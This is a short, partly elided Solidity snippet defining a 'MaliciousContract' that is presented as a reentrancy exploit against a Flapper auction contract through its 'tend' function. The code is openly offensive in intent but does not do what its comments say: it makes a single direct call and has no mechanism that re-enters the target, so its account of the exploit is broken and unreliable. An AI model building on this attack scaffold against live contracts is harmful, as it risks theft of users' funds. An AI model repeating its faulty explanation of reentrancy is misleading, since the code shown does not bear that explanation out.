...
contract MaliciousContract {
    ...
    constructor(Flapper _flapper) public {
        flapper = _flapper;
    }

    // Function to be called repeatedly
    function att(uint id, uint lot, uint bid) external {
        // Exploit reentrancy by calling Flapper's vulnerable function
        flapper.tend(id, lot, bid);

        // Malicious contract can perform additional actions during the reentrancy
        // (e.g., making more calls to the vulnerable function)
    }
}
